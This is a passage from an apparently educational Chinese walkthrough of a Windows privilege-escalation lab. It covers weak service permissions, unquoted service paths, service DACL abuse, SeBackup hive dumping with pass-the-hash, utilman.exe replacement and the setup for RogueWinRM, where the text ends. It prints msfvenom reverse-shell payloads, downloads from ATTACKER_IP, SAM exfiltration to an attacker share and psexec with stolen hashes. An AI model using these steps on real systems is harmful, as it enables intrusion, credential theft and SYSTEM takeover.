<pre><code class="hljs scss">C:\&gt; sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        START_TYPE         : <span class="hljs-number">2</span>   AUTO_START
        ERROR_CONTROL      : <span class="hljs-number">0</span>   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : <span class="hljs-number">0</span>
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1</code></pre>
<p>我们可以看到漏洞软件安装的服务以 svcuser1 身份运行，与该服务关联的可执行文件位于 <code>C:\Progra~2\System~1\WService.exe</code> 中。然后我们继续检查可执行文件的权限：</p>
<pre><code class="hljs scss">C:\Users\thm-unpriv&gt;icacls C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\WService.exe
C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed <span class="hljs-number">1</span> files; Failed processing <span class="hljs-number">0</span> files</code></pre>
<p>这里有一些有趣的事情。 Everyone 组对服务的可执行文件具有修改权限 (M)。这意味着我们可以简单地用我们偏好的任何有效负载覆盖它，并且该服务将使用配置的用户帐户的权限执行它。</p>
<p>让我们使用 msfvenom 生成一个 exe-service 负载并通过 python Web 服务器提供它：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4445</span> -f exe-service -o rev-svc.exe

user<span class="hljs-keyword">@attackerpc</span>$ python3 -m http.server
Serving HTTP on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> port <span class="hljs-number">8000</span> (<span class="hljs-attribute">http</span>://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8000</span>/) ...</code></pre>
<p>然后我们可以使用以下命令从 Powershell 中提取有效负载：</p>
<pre><code class="hljs scss">wget http://ATTACKER_IP:<span class="hljs-number">8000</span>/rev-svc.exe -O rev-svc.exe</code></pre>
<p>一旦有效负载位于 Windows 服务器中，我们就继续用有效负载替换服务可执行文件。由于我们需要另一个用户来执行我们的有效负载，因此我们还希望向Everyone组授予完全权限：</p>
<pre><code class="hljs scss">C:\&gt; cd C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\

C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>&gt; move WService.exe WService.exe.bkp
        <span class="hljs-number">1</span> <span class="hljs-built_in">file</span>(s) moved.

C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        <span class="hljs-number">1</span> <span class="hljs-built_in">file</span>(s) moved.

C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>&gt; icacls WService.exe /grant Everyone:F
        Successfully processed <span class="hljs-number">1</span> files.</code></pre>
<p>我们在攻击者机器上启动一个反向侦听器：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4445</span></code></pre>
<p>最后，重新启动服务。虽然在正常情况下，您可能需要等待服务重新启动，但您已被分配了自行重新启动服务的权限，以节省一些时间。从 cmd.exe 命令提示符使用以下命令：</p>
<pre><code class="hljs scss">C:\&gt; sc stop windowsscheduler
C:\&gt; sc start windowsscheduler</code></pre>
<p>注意：PowerShell 将 <code>sc</code> 作为 <code>Set-Content</code> 的别名，因此您需要使用 <code>sc.exe</code> 才能以这种方式使用 PowerShell 控制服务。</p>
<p>结果，您将获得具有 svcusr1 权限的反向 shell：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4445</span>
Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">4445</span>
Connection received on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span> <span class="hljs-number">50649</span>
Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.

<span class="hljs-attribute">C</span>:\Windows\system32&gt;whoami
wprivesc1\svcusr1</code></pre>
<h2 id="45-未加引号的服务路径">4.5 未加引号的服务路径</h2>
<p>当我们无法像以前一样直接写入服务可执行文件时，仍然有机会通过使用相当模糊的功能来强制服务运行任意可执行文件。</p>
<p>使用 Windows 服务时，当服务配置为指向“未加引号”的可执行文件时，会出现非常特殊的行为。不加引号是指未正确引用关联可执行文件的路径以解决命令中的空格问题。</p>
<p>作为示例，让我们看一下两个服务之间的区别（这些服务仅用作示例，可能在您的计算机中不可用）。第一个服务将使用正确的引用，以便 SCM 毫无疑问地知道它必须执行 <code>"C:\Program Files\RealVNC\VNC Server\vncserver.exe"</code> 指向的二进制文件，后跟给定的参数：</p>
<pre><code class="hljs scss">C:\&gt; sc qc <span class="hljs-string">"vncserver"</span>
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        START_TYPE         : <span class="hljs-number">2</span>   AUTO_START
        ERROR_CONTROL      : <span class="hljs-number">0</span>   IGNORE
        BINARY_PATH_NAME   : <span class="hljs-string">"C:\Program Files\RealVNC\VNC Server\vncserver.exe"</span> -service
        LOAD_ORDER_GROUP   :
        TAG                : <span class="hljs-number">0</span>
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem</code></pre>
<p><strong>请记住：PowerShell 将“sc”作为“Set-Content”的别名，因此，如果您处于 PowerShell 提示符中，则需要使用“sc.exe”来控制服务。</strong></p>
<p>现在让我们看看另一项没有正确报价的服务：</p>
<pre><code class="hljs scss">C:\&gt; sc qc <span class="hljs-string">"disk sorter enterprise"</span>
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        START_TYPE         : <span class="hljs-number">2</span>   AUTO_START
        ERROR_CONTROL      : <span class="hljs-number">0</span>   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : <span class="hljs-number">0</span>
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2</code></pre>
<p>当 SCM 尝试执行关联的二进制文件时，就会出现问题。由于“Disk Sorter Enterprise”文件夹的名称上有空格，因此该命令变得不明确，并且 SCM 不知道您正在尝试执行以下哪一个：</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Argument 1</th>
<th>Argument 2</th>
</tr>
</thead>
<tbody>
<tr>
<td>C:\MyPrograms\Disk.exe</td>
<td>Sorter</td>
<td>Enterprise\bin\disksrs.exe</td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter.exe</td>
<td>Enterprise\bin\disksrs.exe</td>
<td></td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>这与命令提示符如何解析命令有关。通常，当您发送命令时，空格将用作参数分隔符，除非它们是带引号的字符串的一部分。这意味着未加引号的命令的“正确”解释是执行 <code>C:\\MyPrograms\\Disk.exe</code> 并将其余部分作为参数。</p>
<p>SCM 没有像它可能应该发生的那样失败，而是尝试帮助用户并开始按照表中所示的顺序搜索每个二进制文件：</p>
<ol>
<li>首先，搜索 <code>C:\\MyPrograms\\Disk.exe</code> 。如果存在，该服务将运行此可执行文件。</li>
<li>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter.exe</code> 。如果存在，该服务将运行此可执行文件。</li>
<li>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code> 。此选项预计会成功，并且通常会在默认安装中运行。</li>
</ol>
<p>从这个行为来看，问题就显而易见了。如果攻击者创建了在预期服务可执行文件之前搜索的任何可执行文件，他们就可以强制服务运行任意可执行文件。</p>
<p>虽然这听起来微不足道，但默认情况下，大多数服务可执行文件将安装在 <code>C:\Program Files</code> 或 <code>C:\Program Files (x86)</code> 下，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则也有例外： - 某些安装程序更改已安装文件夹的权限，使服务容易受到攻击。 - 管理员可能决定将服务二进制文件安装在非默认路径中。如果这样的路径是全局可写的，则该漏洞可以被利用。</p>
<p>在我们的例子中，管理员在 <code>c:\MyPrograms</code> 下安装了磁盘排序器二进制文件。默认情况下，它继承 <code>C:\</code> 目录的权限，允许任何用户在其中创建文件和文件夹。我们可以使用 <code>icacls</code> 来检查：</p>
<pre><code class="hljs scss">C:\&gt;icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed <span class="hljs-number">1</span> files; Failed processing <span class="hljs-number">0</span> files</code></pre>
<p><code>BUILTIN\\Users</code> 组拥有AD和WD权限，分别允许用户创建子目录和文件。</p>
<p>使用 msfvenom 创建 exe-service Payload 并将其传输到目标主机的过程与以前相同，因此请像以前一样创建以下 Payload 并将其上传到服务器。我们还将启动一个侦听器来接收反向 shell 执行时的情况：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4446</span> -f exe-service -o rev-svc2.exe

user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4446</span></code></pre>
<p>一旦有效负载进入服务器，请将其移动到可能发生劫持的任何位置。在这种情况下，我们将把有效负载移动到 <code>C:\MyPrograms\Disk.exe</code> 。我们还将授予每个人对该文件的完全权限，以确保该服务可以执行该文件：</p>
<pre><code class="hljs scss">C:\&gt; move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\&gt; icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed <span class="hljs-number">1</span> files.</code></pre>
<p>服务重新启动后，您的有效负载应该执行：</p>
<pre><code class="hljs scss">C:\&gt; sc stop <span class="hljs-string">"disk sorter enterprise"</span>
C:\&gt; sc start <span class="hljs-string">"disk sorter enterprise"</span></code></pre>
<p>结果，您将获得具有 svcusr2 权限的反向 shell：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4446</span>
Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">4446</span>
Connection received on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span> <span class="hljs-number">50650</span>
Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.

<span class="hljs-attribute">C</span>:\Windows\system32&gt;whoami
wprivesc1\svcusr2</code></pre>
<h2 id="46-不安全的服务权限">4.6 不安全的服务权限</h2>
<p>如果服务的可执行 DACL 配置良好，并且正确引用了服务的二进制路径，那么您仍然有机会利用该服务。如果服务 DACL（不是服务的可执行 DACL）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向所需的任何可执行文件并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</p>
<p>要从命令行检查服务 DACL，您可以使用 Sysinternals 套件中的 Accesschk。为了您的方便，可在 <code>C:\\tools</code> 获取副本。检查 thmservice 服务 DACL 的命令是：</p>
<pre><code class="hljs scss">C:\tools\AccessChk&gt; accesschk64.exe -qlc thmservice
  [<span class="hljs-number">0</span>] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [<span class="hljs-number">4</span>] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS</code></pre>
<p>这里我们可以看到 <code>BUILTIN\\Users</code> 组拥有SERVICE_ALL_ACCESS权限，这意味着任何用户都可以重新配置服务。</p>
<p>在更改服务之前，让我们构建另一个 exe-service 反向 shell，并在攻击者的计算机上启动它的侦听器：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4447</span> -f exe-service -o rev-svc3.exe

user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4447</span></code></pre>
<p>然后，我们将反向 shell 可执行文件传输到目标机器并将其存储在 <code>C:\Users\thm-unpriv\rev-svc3.exe</code> 中。请随意使用 wget 传输您的可执行文件并将其移动到所需的位置。请记住授予每个人执行您的有效负载的权限：</p>
<pre><code class="hljs scss">C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F</code></pre>
<p>要更改服务关联的可执行文件和帐户，我们可以使用以下命令（使用 sc.exe 时请注意等号后面的空格）：</p>
<pre><code class="hljs scss">C:\&gt; sc config THMService binPath= <span class="hljs-string">"C:\Users\thm-unpriv\rev-svc3.exe"</span> obj= LocalSystem</code></pre>
<p>请注意，我们可以使用任何帐户来运行该服务。我们选择 LocalSystem，因为它是可用的最高特权帐户。要触发我们的有效负载，剩下的就是重新启动服务：</p>
<pre><code class="hljs scss">C:\&gt; sc stop THMService
C:\&gt; sc start THMService</code></pre>
<p>我们将在攻击者的机器上收到一个具有系统权限的 shell：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4447</span>
Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">4447</span>
Connection received on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span> <span class="hljs-number">50650</span>
Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.

<span class="hljs-attribute">C</span>:\Windows\system32&gt;whoami
NT AUTHORITY\SYSTEM</code></pre>
<h3 id="tips">tips</h3>
<p>权限是帐户执行特定系统相关任务所拥有的权利。这些任务可以像关闭计算机的权限一样简单，也可以像绕过某些基于 DACL 的访问控制的权限一样简单。</p>
<p>每个用户都有一组分配的权限，可以使用以下命令进行检查：</p>
<pre><code class="hljs scss">whoami /priv</code></pre>
<p>此处提供了 Windows 系统上可用权限的完整列表。从攻击者的角度来看，只有那些允许我们在系统中升级的权限才有意义。您可以在 Priv2Admin Github 项目上找到可利用权限的完整列表。</p>
<p>虽然我们不会逐一查看，但我们将展示如何滥用您可以找到的一些最常见的特权。</p>
<h2 id="47-sebackup-serestore">4.7 SeBackup / SeRestore</h2>
<p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，忽略任何 DACL。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。</p>
<p>有了这种能力，攻击者可以使用多种技术轻松提升系统权限。我们将研究的方法包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希值。</p>
<p>接下来实操的帐户属于“Backup Operators”组，默认情况下被授予 SeBackup 和 SeRestore 权限。我们需要使用“以管理员身份打开”选项打开命令提示符才能使用这些权限。我们将被要求再次输入密码以获得提升的控制台：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104544115.png" alt="image-20240206104544115"></p>
<p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p>
<pre><code class="hljs scss">C:\&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p>要备份 SAM 和 SYSTEM 哈希值，我们可以使用以下命令：</p>
<pre><code class="hljs scss">C:\&gt; reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\&gt; reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.</code></pre>
<p>这将创建几个包含注册表配置单元内容的文件。现在，我们可以使用 SMB 或任何其他可用方法将这些文件复制到攻击者计算机。对于 SMB，我们可以使用 impacket 的 <code>smbserver.py</code> 在 AttackBox 的当前目录中启动一个带有网络共享的简单 SMB 服务器：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ mkdir share
user<span class="hljs-keyword">@attackerpc</span>$ python3.<span class="hljs-number">9</span> /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share</code></pre>
<p>这将创建一个名为 <code>public</code> 的共享，指向 <code>share</code> 目录，该目录需要当前 Windows 会话的用户名和密码。之后，我们可以在 Windows 机器中使用 <code>copy</code> 命令将这两个文件传输到 AttackBox：</p>
<pre><code class="hljs scss">C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\</code></pre>
<p>并使用 impacket 检索用户的密码哈希值：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ python3.<span class="hljs-number">9</span> /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.<span class="hljs-number">9.24</span>.dev1+<span class="hljs-number">20210704.162046</span>.<span class="hljs-number">29</span>ad5792 - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation

[*] Target system <span class="hljs-attribute">bootKey</span>: <span class="hljs-number">0</span>x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (<span class="hljs-attribute">uid</span>:<span class="hljs-attribute">rid</span>:<span class="hljs-attribute">lmhash</span>:nthash)
<span class="hljs-attribute">Administrator</span>:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404<span class="hljs-attribute">ee</span>:<span class="hljs-number">13</span>a04cdcf3f7ec41264e568127c5ca94:::
<span class="hljs-attribute">Guest</span>:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404<span class="hljs-attribute">ee</span>:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</code></pre>
<p>我们终于可以使用管理员的哈希来执行哈希传递攻击并获得具有系统权限的目标计算机的访问权限：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ python3.<span class="hljs-number">9</span> /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404<span class="hljs-attribute">ee</span>:<span class="hljs-number">13</span>a04cdcf3f7ec41264e568127c5ca94 administrator<span class="hljs-keyword">@MACHINE</span>_IP
Impacket v0.<span class="hljs-number">9.24</span>.dev1+<span class="hljs-number">20210704.162046</span>.<span class="hljs-number">29</span>ad5792 - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation

[*] Requesting shares on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span>.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span>.....
[*] Creating service RoLE on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span>.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.

<span class="hljs-attribute">C</span>:\Windows\system32&gt; whoami
nt authority\system</code></pre>
<h2 id="48-setakeownership">4.8 SeTakeOwnership</h2>
<p>SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项，这为攻击者提升权限提供了多种可能性，例如，我们可以搜索作为 SYSTEM 运行的服务并获取所有权服务的可执行文件。然而，对于这项任务，我们将采取不同的路线。</p>
<p>要获得 SeTakeOwnership 权限，我们需要使用“以管理员身份打开”选项打开命令提示符。我们将被要求输入密码以获得提升的控制台：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104653145.png" alt="image-20240206104653145"></p>
<p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p>
<pre><code class="hljs scss">C:\&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled</code></pre>
<p>这次我们将滥用 <code>utilman.exe</code> 来升级权限。 Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供“轻松访问”选项：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104707798.png" alt="image-20240206104707798"></p>
<p>由于 Utilman 是以 SYSTEM 权限运行的，因此如果我们将原始二进制文件替换为我们喜欢的任何有效负载，我们将有效地获得 SYSTEM 权限。由于我们可以拥有任何文件的所有权，因此替换它是微不足道的。</p>
<p>要替换 utilman，我们将首先使用以下命令获取它的所有权：</p>
<pre><code class="hljs scss">C:\&gt; takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): <span class="hljs-string">"C:\Windows\System32\Utilman.exe"</span> now owned by user <span class="hljs-string">"WINPRIVESC2\thmtakeownership"</span>.</code></pre>
<p>请注意，成为文件的所有者并不一定意味着您拥有该文件的权限，但作为所有者，您可以为自己分配所需的任何权限。要为您的用户授予 utilman.exe 的完全权限，您可以使用以下命令：</p>
<pre><code class="hljs scss">C:\&gt; icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed <span class="hljs-number">1</span> files; Failed processing <span class="hljs-number">0</span> files</code></pre>
<p>之后，我们将用 cmd.exe 的副本替换 utilman.exe：</p>
<pre><code class="hljs scss">C:\Windows\System32\&gt; copy cmd.exe utilman.exe
        <span class="hljs-number">1</span> <span class="hljs-built_in">file</span>(s) copied.</code></pre>
<p>要触发 utilman，我们将从开始按钮锁定屏幕：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104737094.png" alt="image-20240206104737094"></p>
<p>最后，继续单击“轻松访问”按钮，该按钮将以系统权限运行 utilman.exe。由于我们将其替换为 cmd.exe 副本，因此我们将获得具有 SYSTEM 权限的命令提示符：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104746589.png" alt="image-20240206104746589"></p>
<h2 id="49-seimpersonate-seassignprimarytoken">4.9 SeImpersonate / SeAssignPrimaryToken</h2>
<p>这些权限允许进程模拟其他用户并代表他们执行操作。模拟通常包括能够在另一个用户的安全上下文下生成进程或线程。</p>
<p>当您考虑 FTP 服务器的工作原理时，就很容易理解模拟。 FTP 服务器必须限制用户只能访问他们应该被允许查看的文件。</p>
<p>假设我们有一个使用用户 <code>ftp</code> 运行的 FTP 服务。在没有模拟的情况下，如果用户 Ann 登录 FTP 服务器并尝试访问她的文件，FTP 服务将尝试使用其访问令牌而不是 Ann 的访问令牌来访问它们：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104812815.png" alt="image-20240206104812815"></p>
<p>使用 ftp 令牌不是最好的主意有以下几个原因： - 为了正确提供文件， <code>ftp</code> 用户需要可以访问它们。在上面的示例中，FTP 服务将能够访问 Ann 的文件，但不能访问 Bill 的文件，因为 Bill 文件中的 DACL 不允许用户 <code>ftp</code> 。这增加了复杂性，因为我们必须为每个提供的文件/目录手动配置特定权限。 - 对于操作系统，所有文件均由用户 <code>ftp</code> 访问，与当前登录 FTP 服务的用户无关。这使得无法将授权委托给操作系统；因此，FTP服务必须实现它。 - 如果 FTP 服务在某个时刻遭到破坏，攻击者将立即获得对 <code>ftp</code> 用户有权访问的所有文件夹的访问权限。</p>
<p>另一方面，如果 FTP 服务的用户具有 SeImpersonate 或 SeAssignPrimaryToken 权限，则所有这些都会稍微简化，因为 FTP 服务可以临时获取登录用户的访问令牌，并使用它来执行其上的任何任务。代表：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104823603.png" alt="image-20240206104823603"></p>
<p>现在，如果用户 Ann 登录到 FTP 服务，并且考虑到 ftp 用户具有模拟权限，则它可以借用 Ann 的访问令牌并使用它来访问她的文件。这样，文件不需要以任何方式向用户 <code>ftp</code> 提供访问权限，并且操作系统会处理授权。由于 FTP 服务正在冒充 Ann，因此在该会话期间它将无法访问 Jude 或 Bill 的文件。</p>
<p>作为攻击者，如果我们设法控制具有 SeImpersonate 或 SeAssignPrimaryToken 权限的进程，我们就可以模拟连接该进程并对其进行身份验证的任何用户。</p>
<p>在Windows系统中，你会发现LOCAL SERVICE和NETWORK SERVICE ACCOUNTS已经拥有这样的权限。由于这些帐户用于使用受限帐户生成服务，因此如果服务需要，允许它们模拟连接用户是有意义的。 Internet 信息服务 (IIS) 还将为 Web 应用程序创建一个名为“iis apppool\defaultapppool”的类似默认帐户。</p>
<p>要使用此类帐户提升权限，攻击者需要满足以下条件： 1. 生成一个进程，以便用户可以连接该进程并对其进行身份验证，以进行模拟。 2.找到一种方法来强制特权用户连接并验证生成的恶意进程。</p>
<p>我们将使用 RogueWinRM 漏洞来实现这两个条件。</p>
<p>首先，假设我们已经入侵了一个在 IIS 上运行的网站，并且我们已经在以下地址植入了 Web shell：</p>
<pre><code class="hljs scss">http://MACHINE_IP/</code></pre>
<p>我们可以使用 Web shell 检查受感染帐户的分配权限，并确认我们拥有此任务感兴趣的两项权限：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104845464.png" alt="image-20240206104845464"></p>
<p>要使用RogueWinRM，我们首先需要将漏洞利用程序上传到目标机器。为了您的方便，这已经完成，您可以在 <code>C:\tools\</code> 文件夹中找到该漏洞。</p>
<p>RogueWinRM 漏洞利用是可能的，因为每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它都会使用系统权限自动创建到端口 5985 的连接。端口 5985 通常用于 WinRM 服务，它只是一个公开 Powershell 控制台以通过网络远程使用的端口。可以将其想象为 SSH，但使用 Powershell。</p>
<p>如果由于某种原因，WinRM 服务没有在受害服务器上运行，则攻击者可以在端口 5985 上启动伪造的 WinRM 服务，并在启动时捕获 BITS 服务进行的身份验证尝试。如果攻击者具有SeImpersonate权限，他可以代表连接用户（即SYSTEM）执行任何命令。</p>
<p>在运行漏洞之前，我们将启动一个 netcat 侦听器以在攻击者的计算机上接收反向 shell：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4442</span></code></pre>
<p>然后，使用我们的 Web shell 使用以下命令触发 RogueWinRM 漏洞利用：</p>
